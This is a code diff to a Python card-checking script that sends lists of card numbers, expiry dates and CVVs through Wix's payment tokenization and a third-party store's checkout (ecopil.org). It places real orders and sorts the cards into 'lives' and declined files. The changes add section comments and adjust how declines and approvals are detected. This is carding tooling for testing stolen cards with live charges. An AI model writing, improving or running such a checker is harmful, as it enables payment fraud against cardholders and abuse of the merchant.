@@ -454,11 +454,15 @@ def procesar_tarjeta_wix(linea_cc):
         mes_str = partes[1].strip()
         cc_yyyy = int(partes[2].strip())
         cc_cvv = partes[3].strip()
+        
+        # Regla: Quitar el cero inicial de los meses del 1 al 9 convirtiéndolos a entero
         cc_mm = int(mes_str)
 
         session = requests.Session()
 
+        # =========================================================
         # 1. #GEN_TOKEN_CC
+        # =========================================================
         headers_tokenize = {
             "Host": "cashier-pci.wixapps.net",
             "Content-Length": "166",
@@ -502,7 +506,9 @@ def procesar_tarjeta_wix(linea_cc):
         except Exception:
             return False, f"Tokenización fallida: {resp.text[:80]}"
 
+        # =========================================================
         # 2. #TOKEN_V2 (Payment Details)
+        # =========================================================
         headers_v2 = {
             "Host": "www.ecopil.org",
             "Content-Length": "443",
@@ -555,7 +561,9 @@ def procesar_tarjeta_wix(linea_cc):
         except Exception:
             return False, f"Detalle error v2: {resp.text[:80]}"
 
+        # =========================================================
         # 3. #CARRO_TOKEN (Crear Carrito Nuevo)
+        # =========================================================
         headers_cart = {
             "Host": "www.ecopil.org",
             "Content-Length": "309",
@@ -597,7 +605,9 @@ def procesar_tarjeta_wix(linea_cc):
         except Exception:
             return False, f"Error al crear carrito: {resp.text[:80]}"
 
+        # =========================================================
         # 4. #TESTEAR_CC (Place Order)
+        # =========================================================
         url_place_order = f"https://www.ecopil.org/_api/cart-v2/v2/carts/{carro_tok}/place-order"
 
         headers_place_order = {
@@ -637,17 +647,13 @@ def procesar_tarjeta_wix(linea_cc):
         resp = session.post(url_place_order, headers=headers_place_order, json=payload_place_order, timeout=20)
         resultado = resp.text
 
-        if 'description":"Invalid payment status: DECLINED"' in resultado or '"transactionStatus":"DECLINED"' in resultado or 'DECLINED' in resultado:
+        if 'description":"Invalid payment status: DECLINED"' in resultado or '"transactionStatus":"DECLINED"' in resultado:
             msg_fail = "Declined"
-            try:
-                msg_fail = resp.json().get("description", "Declined")
-            except Exception:
-                pass
             with open(FAIL_FILE, "a", encoding="utf-8") as f:
                 f.write(f"{linea_cc} | {msg_fail}\n")
             return False, msg_fail
 
-        if '"completed":true' in resultado or "paymentResponseToken" in resultado or resp.status_code == 200:
+        if '"completed":true, "paymentResponseToken"' in resultado or resp.status_code == 200:
             msg_success = "Approved ($50 Charged/Success)"
             with open(LIVES_FILE, "a", encoding="utf-8") as f:
                 f.write(f"{linea_cc} | {msg_success}\n")
